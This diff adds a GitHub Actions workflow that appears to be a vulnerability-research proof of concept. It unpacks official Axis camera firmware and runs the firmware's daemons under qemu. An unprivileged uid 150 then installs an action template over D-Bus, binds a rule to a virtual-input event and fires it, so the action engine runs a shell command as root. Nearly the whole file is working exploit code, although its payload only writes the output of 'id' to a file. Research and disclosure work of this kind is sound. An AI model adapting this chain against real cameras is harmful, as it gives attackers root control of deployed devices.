@@ -1,0 +1,259 @@
+name: trigger-poc
+# HYP-AX-001 executed-proof, leg 2: template FIRES.
+# Chain: uid-150 AddFromFile (proven run 40636817020) -> ActionConfiguration.Add binds
+# template -> ActionRule.Add binds topic tns1:Device/tnsaxis:IO/tnsaxis:VirtualInput
+# -> virtualinputd Activate() emits the event via event_switch -> actionengined runs
+# start_command AS ROOT -> /tmp/proof_ae contains uid=0(root).
+on:
+  workflow_dispatch:
+    inputs:
+      firmware_url:
+        description: "Official ftp.axis.com .bin URL"
+        required: true
+      firmware_sha256:
+        description: "Expected SHA256 of the .bin"
+        required: true
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Install tooling
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq qemu-user-static zstd python3-pip gcc-aarch64-linux-gnu libc6-dev-arm64-cross
+          python3 -m pip install --quiet PySquashfsImage zstandard
+
+      - name: Download and verify official firmware
+        run: |
+          cd /tmp
+          curl -sS -o fw.bin "${{ github.event.inputs.firmware_url }}"
+          echo "${{ github.event.inputs.firmware_sha256 }}  fw.bin" | sha256sum -c -
+
+      - name: Unpack container + extract rootfs (real symlinks)
+        run: |
+          cd /tmp
+          python3 - <<'EOF'
+          import gzip, tarfile, os, sys
+          magic = open('fw.bin','rb').read(4)
+          if magic[:2] == b'\x1f\x8b':
+              raw = gzip.open('fw.bin','rb').read()
+          elif magic == b'\x28\xb5\x2f\xfd':
+              import zstandard
+              raw = zstandard.ZstdDecompressor().stream_reader(open('fw.bin','rb')).read()
+          else:
+              sys.exit('unknown container magic %r' % magic)
+          open('fw.tar','wb').write(raw)
+          tf = tarfile.open('fw.tar'); tf.extractall('pkg')
+          from PySquashfsImage import SquashFsImage
+          img = SquashFsImage(open('pkg/rootfs.img','rb'))
+          def sanitize(n):
+              for c in '\\/:*?"<>|': n = n.replace(c,'_')
+              return n
+          def walk(node, outdir):
+              name = node.name
+              if isinstance(name, bytes): name = name.decode('utf-8','replace')
+              path = os.path.join(outdir, sanitize(name))
+              if node.is_dir:
+                  os.makedirs(path, exist_ok=True)
+                  for ch in node.iterdir():
+                      try: walk(ch, path)
+                      except Exception as e: print('walk fail', path, e)
+                  return
+              if node.is_symlink:
+                  t = node.readlink()
+                  if isinstance(t, bytes): t = t.decode('utf-8','replace')
+                  try:
+                      if os.path.lexists(path): os.remove(path)
+                      os.symlink(t, path)
+                  except (OSError, ValueError):
+                      open(path + '.symlink','w').write(t)
+                  return
+              try: data = img.read_file(node.inode)
+              except Exception as e:
+                  print('read fail', path, e); return
+              if data is None: return
+              open(path,'wb').write(data)
+              try: os.chmod(path, node.mode & 0o777)
+              except OSError: pass
+          os.makedirs('rootfs', exist_ok=True)
+          for ch in img.root.iterdir(): walk(ch, 'rootfs')
+          print('rootfs extracted')
+          EOF
+          sudo mv /tmp/rootfs /opt/rootfs
+
+      - name: Provision chroot runtime dirs + cross-compile client
+        run: |
+          for p in var/run var/tmp var/volatile tmp; do
+            if [ -L "/opt/rootfs/$p" ]; then sudo rm -f "/opt/rootfs/$p"; fi
+            sudo mkdir -p "/opt/rootfs/$p"
+          done
+          sudo mkdir -p /opt/rootfs/var/run/dbus /opt/rootfs/var/lib/dbus /opt/rootfs/run/dbus
+          sudo mkdir -p /opt/rootfs/etc/actionengine/system/1/actiontemplates \
+                        /opt/rootfs/etc/actionengine/system/1/configurations \
+                        /opt/rootfs/etc/actionengine/system/1/rules \
+                        /opt/rootfs/etc/actionengine/system/1/recipients \
+                        /opt/rootfs/etc/actionengine/user/1/actiontemplates \
+                        /opt/rootfs/etc/event_switch/declarations.d
+          sudo chmod 1777 /opt/rootfs/tmp
+          sudo chmod -R 777 /opt/rootfs/etc/actionengine /opt/rootfs/etc/event_switch
+          sudo mknod /opt/rootfs/dev/null c 1 3 2>/dev/null || true
+          sudo chmod 666 /opt/rootfs/dev/null 2>/dev/null || true
+          aarch64-linux-gnu-gcc -static -O2 -o /tmp/runas targets/axis-os/poc-harness/runas.c 2>/dev/null || \
+            aarch64-linux-gnu-gcc -static -O2 -o /tmp/runas runas.c
+          file /tmp/runas
+          sudo cp /tmp/runas /opt/rootfs/tmp/
+          sudo cp /usr/bin/qemu-aarch64-static /opt/rootfs/usr/bin/
+
+      - name: Bring up dbus, event_switch, virtualinputd, actionengined, geolocationd
+        run: |
+          set +e
+          echo "=== dbus-uuidgen + dbus-daemon --system ==="
+          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/dbus-uuidgen --ensure 2>&1 | head -2
+          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/dbus-daemon --system --nofork --nopidfile --address=unix:path=/run/dbus/system_bus_socket > /tmp/dbus.log 2>&1 &
+          sleep 5
+          sudo ls -la /opt/rootfs/run/dbus/ || true
+          echo "=== start event_switch -n (the event broker, com.axis.Event.Switch) ==="
+          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/event_switch -n > /tmp/event_switch.log 2>&1 &
+          sleep 6
+          echo "--- event_switch log (verbatim) ---"
+          sudo cat /tmp/event_switch.log | head -20
+          echo "=== start virtualinputd -n -i virtualinputd -p 64 (producer: com.axis.VirtualInput.Port) ==="
+          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/virtualinputd -n -i virtualinputd -p 64 > /tmp/vinput.log 2>&1 &
+          sleep 6
+          echo "--- virtualinputd log (verbatim) ---"
+          sudo cat /tmp/vinput.log | head -20
+          echo "=== start actionengined (consumer + the ROOT action executor) ==="
+          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/actionengined -ni actionengined.system -c /usr/share/actionengine/action_engine_system.conf > /tmp/ae.log 2>&1 &
+          sleep 8
+          echo "--- actionengined log (verbatim) ---"
+          sudo cat /tmp/ae.log | head -30
+          echo "=== start geolocationd (E5 control target: default-deny dbus policy) ==="
+          sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/geolocationd -n > /tmp/geo.log 2>&1 &
+          sleep 5
+          echo "--- geolocationd log (verbatim, first lines) ---"
+          sudo cat /tmp/geo.log | head -10
+          echo "=== bus names owned (verbatim) ==="
+          timeout 20 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl --no-pager list 2>&1 | head -15
+          echo "=== daemons alive? ==="
+          pgrep -af "qemu-aarch64" | head -8 || true
+
+      - name: uid-150 installs action template (AddFromFile, known-good) + creates configuration + rule
+        run: |
+          set +e
+          sudo tee /opt/rootfs/tmp/ae_poc.xml > /dev/null <<'XML'
+          <action>
+            <id>com.axis.action.poc.ae001</id>
+            <action_type>one_shot</action_type>
+            <parameters>
+            </parameters>
+            <commands>
+              <validate_command>
+                <exec_command>
+                  <path>/bin/true</path>
+                </exec_command>
+              </validate_command>
+              <start_command>
+                <exec_command>
+                  <path>/bin/sh</path>
+                  <exec_argument>-c</exec_argument>
+                  <exec_argument>id &gt; /tmp/proof_ae 2&gt;&amp;1</exec_argument>
+                </exec_command>
+              </start_command>
+            </commands>
+          </action>
+          XML
+          sudo chmod 644 /opt/rootfs/tmp/ae_poc.xml
+          rm -f /opt/rootfs/tmp/proof_ae
+          echo "=== STEP 1: uid 150 -> ActionTemplate.AddFromFile ==="
+          timeout 25 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /usr/bin/busctl call --no-pager com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionTemplate AddFromFile s "/tmp/ae_poc.xml" 2>&1 | head -6
+          echo "step1 exit: $?"
+          sleep 2
+          echo "=== STEP 2: uid 150 -> ActionConfiguration.Add (binds template; try (template_id, nice_name) then swap) ==="
+          timeout 25 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /usr/bin/busctl call --no-pager com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionConfiguration Add ssa{ss} "com.axis.action.poc.ae001" "poc_conf" 0 2>&1 | tee /tmp/confadd_a.log | head -6
+          echo "step2a exit: $?"
+          if ! grep -q '^s "' /tmp/confadd_a.log; then
+            echo "--- variant B: (nice_name, template_id) ---"
+            timeout 25 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /usr/bin/busctl call --no-pager com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionConfiguration Add ssa{ss} "poc_conf" "com.axis.action.poc.ae001" 0 2>&1 | tee /tmp/confadd_b.log | head -6
+            echo "step2b exit: $?"
+          fi
+          CONF_ID=$(grep -ohE '[0-9]+' /tmp/confadd_a.log /tmp/confadd_b.log 2>/dev/null | head -1)
+          echo "parsed primary config id: ${CONF_ID:-NONE}"
+          echo "=== ActionConfiguration.List (verbatim) ==="
+          timeout 25 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl call --no-pager com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionConfiguration List 2>&1 | head -10
+          echo "=== STEP 3: build start_event XML (topic = VirtualInput declaration file) and try ActionRule.Add variants ==="
+          sudo tee /opt/rootfs/tmp/start_event.xml > /dev/null <<'XML'
+          <?xml version="1.0" encoding="UTF-8"?><wsnt:TopicExpression xmlns:wsnt="http://docs.oasis-open.org/wsn/b-2" xmlns:tns1="http://www.onvif.org/ver10/topics" xmlns:tnsaxis="http://www.axis.com/2009/event/topics" Dialect="http://docs.oasis-open.org/wsn/t-1/TopicExpression/Concrete">tns1:Device/tnsaxis:IO/tnsaxis:VirtualInput</wsnt:TopicExpression>
+          XML
+          sudo cp /opt/rootfs/tmp/start_event.xml /opt/rootfs/tmp/start_event_cset.xml
+          sudo sed -i 's#http://docs.oasis-open.org/wsn/t-1/TopicExpression/Concrete#http://www.onvif.org/ver10/tev/topicExpression/ConcreteSet#' /opt/rootfs/tmp/start_event_cset.xml
+          sudo tee /opt/rootfs/tmp/start_event_wrap.xml > /dev/null <<'XML'
+          <?xml version="1.0" encoding="UTF-8"?><StartEvent><wsnt:TopicExpression xmlns:wsnt="http://docs.oasis-open.org/wsn/b-2" xmlns:tns1="http://www.onvif.org/ver10/topics" xmlns:tnsaxis="http://www.axis.com/2009/event/topics" Dialect="http://docs.oasis-open.org/wsn/t-1/TopicExpression/Concrete">tns1:Device/tnsaxis:IO/tnsaxis:VirtualInput</wsnt:TopicExpression></StartEvent>
+          XML
+          if [ -z "${CONF_ID}" ]; then CONF_ID=1; fi
+          for VAR in A B C; do
+            case $VAR in
+              A) XF=start_event.xml;;
+              B) XF=start_event_wrap.xml;;
+              C) XF=start_event_cset.xml;;
+            esac
+            # busctl 'ay' consumes: <element count> <count x byte values>
+            CNT=$(sudo od -An -tu1 -v /opt/rootfs/tmp/$XF | tr -s ' \n' ' ' | sed 's/^ //;s/ $//' | wc -w)
+            BYTES=$(sudo od -An -tu1 -v /opt/rootfs/tmp/$XF | tr -s ' \n' ' ' | sed 's/^ //;s/ $//')
+            echo "--- variant $VAR ($XF, $CNT bytes) ---"
+            timeout 30 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /usr/bin/busctl call --no-pager com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionRule Add sbayayuuuii "poc_rule" true $CNT $BYTES 0 0 0 0 0 "${CONF_ID}" -1 2>&1 | tee /tmp/ruleadd_$VAR.log | head -6
+            echo "ruleAdd variant $VAR exit: $?"
+            if grep -qE '^(s|i|u) "' /tmp/ruleadd_$VAR.log; then echo "RULE ADDED (variant $VAR)"; break; fi
+          done
+          echo "=== ActionRule.List (verbatim) ==="
+          timeout 25 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl call --no-pager com.axis.Event.ActionEngine.System /com/axis/Event/ActionEngine com.axis.Event.ActionEngine.ActionRule List 2>&1 | head -10
+          echo "=== rules persisted on disk? ==="
+          sudo find /opt/rootfs/etc/actionengine -type f 2>/dev/null | head -10
+
+      - name: FIRE the bound event as uid 150 and check root-exec proof
+        run: |
+          set +e
+          echo "=== uid 150 -> com.axis.VirtualInput.Port Activate on port 1 ==="
+          timeout 25 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /usr/bin/busctl call --no-pager com.axis.Event.VirtualInput /com/axis/VirtualInput/Port/1 com.axis.VirtualInput.Port Activate 2>&1 | head -6
+          echo "activate exit: $?"
+          sleep 6
+          echo "=== PROOF: /tmp/proof_ae (written by the ROOT actionengined process) ==="
+          sudo ls -la /opt/rootfs/tmp/proof_ae 2>/dev/null && sudo cat /opt/rootfs/tmp/proof_ae || echo "proof_ae NOT created"
+          echo "=== retry fire as root (transport sanity check) ==="
+          timeout 25 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl call --no-pager com.axis.Event.VirtualInput /com/axis/VirtualInput/Port/1 com.axis.VirtualInput.Port Deactivate 2>&1 | head -4
+          sleep 3
+          timeout 25 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /usr/bin/busctl call --no-pager com.axis.Event.VirtualInput /com/axis/VirtualInput/Port/1 com.axis.VirtualInput.Port Activate 2>&1 | head -4
+          sleep 6
+          echo "=== PROOF after root-side fire ==="
+          sudo ls -la /opt/rootfs/tmp/proof_ae 2>/dev/null && sudo cat /opt/rootfs/tmp/proof_ae || echo "proof_ae NOT created"
+          echo "=== event_switch + virtualinputd + actionengined logs (tail) ==="
+          sudo tail -15 /tmp/event_switch.log 2>/dev/null
+          echo "---"
+          sudo tail -15 /tmp/vinput.log 2>/dev/null
+          echo "---"
+          sudo tail -25 /tmp/ae.log 2>/dev/null
+          echo "=== E5 CONTROL: uid 150 -> com.axis.GeoLocation1 (default-deny policy) expect Access denied ==="
+          timeout 25 sudo chroot /opt/rootfs /usr/bin/qemu-aarch64-static /tmp/runas 150 150 /usr/bin/busctl call --no-pager com.axis.GeoLocation1 /com/axis/GeoLocation org.freedesktop.DBus.Properties Get ss "com.axis.GeoLocation1" "Version" 2>&1 | head -6
+          echo "e5 exit: $?"
+          echo "=== END ==="
+
+      - name: Archive logs
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: trigger-poc-logs
+          path: |
+            /tmp/ae.log
+            /tmp/dbus.log
+            /tmp/event_switch.log
+            /tmp/vinput.log
+            /tmp/geo.log
+            /tmp/confadd_a.log
+            /tmp/confadd_b.log
+            /tmp/ruleadd_A.log
+            /tmp/ruleadd_B.log
+            /tmp/ruleadd_C.log
+          if-no-files-found: ignore
